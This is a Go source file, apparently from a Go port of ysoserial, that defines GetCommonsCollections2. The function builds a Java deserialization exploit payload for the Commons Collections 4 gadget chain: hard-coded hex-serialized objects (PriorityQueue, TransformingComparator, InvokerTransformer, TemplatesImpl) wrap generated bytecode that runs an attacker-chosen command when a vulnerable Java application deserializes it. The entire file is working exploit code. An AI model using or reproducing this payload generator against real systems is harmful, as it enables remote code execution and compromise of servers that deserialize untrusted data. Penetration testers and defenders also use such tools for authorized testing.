package gadget

import (
	"encoding/hex"
	"github.com/EmYiQing/Gososerial/ysoserial/util"
)

func GetCommonsCollections2(cmd string) []byte {
	globalPrefix := "ACED0005737200176A6176612E7574696C2E5072696F726974" +
		"79517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70" +
		"617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B" +
		"787000000002737200426F72672E6170616368652E636F6D6D6F6E732E636F" +
		"6C6C656374696F6E73342E636F6D70617261746F72732E5472616E73666F72" +
		"6D696E67436F6D70617261746F722FF984F02BB108CC0200024C0009646563" +
		"6F726174656471007E00014C000B7472616E73666F726D657274002D4C6F72" +
		"672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E73342F54" +
		"72616E73666F726D65723B7870737200406F72672E6170616368652E636F6D" +
		"6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E43" +
		"6F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078" +
		"707372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374" +
		"696F6E73342E66756E63746F72732E496E766F6B65725472616E73666F726D" +
		"657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F" +
		"6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A" +
		"6176612F6C616E672F537472696E673B5B000B69506172616D547970657374" +
		"00125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176" +
		"612E6C616E672E4F626A6563743B90CE589F1073296C020000787000000000" +
		"74000E6E65775472616E73666F726D6572757200125B4C6A6176612E6C616E" +
		"672E436C6173733BAB16D7AECBCD5A99020000787000000000770400000003" +
		"7372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E" +
		"7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C" +
		"09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F" +
		"7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B" +
		"425B00065F636C61737371007E000B4C00055F6E616D6571007E000A4C0011" +
		"5F6F757470757450726F706572746965737400164C6A6176612F7574696C2F" +
		"50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19" +
		"156767DB37020000787000000002757200025B42ACF317F8060854E0020000" +
		"7870"
	templateImpl := GetTemplateImpl(cmd)
	templateImplStr := hex.EncodeToString(templateImpl)
	length := len(templateImpl)
	lenStr := util.Int32ToBytes(uint32(length))
	globalSuffix := "7571007E0018000001D4CAFEBABE00000032001B0A00030015" +
		"07001707001807001901001073657269616C56657273696F6E554944010001" +
		"4A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C69" +
		"6E69743E010003282956010004436F646501000F4C696E654E756D62657254" +
		"61626C650100124C6F63616C5661726961626C655461626C65010004746869" +
		"73010003466F6F01000C496E6E6572436C61737365730100254C79736F7365" +
		"7269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B" +
		"01000A536F7572636546696C6501000C476164676574732E6A6176610C000A" +
		"000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C" +
		"2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A656374" +
		"0100146A6176612F696F2F53657269616C697A61626C6501001F79736F7365" +
		"7269616C2F7061796C6F6164732F7574696C2F476164676574730021000200" +
		"03000100040001001A000500060001000700000002000800010001000A000B" +
		"0001000C0000002F00010001000000052AB70001B100000002000D00000006" +
		"00010000003C000E0000000C000100000005000F0012000000020013000000" +
		"02001400110000000A000100020016001000097074000450776E7270770100" +
		"78737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802" +
		"000149000576616C7565787200106A6176612E6C616E672E4E756D62657286" +
		"AC951D0B94E08B02000078700000000178"
	temp := globalPrefix + lenStr + templateImplStr + globalSuffix
	data, _ := hex.DecodeString(temp)
	return data
}
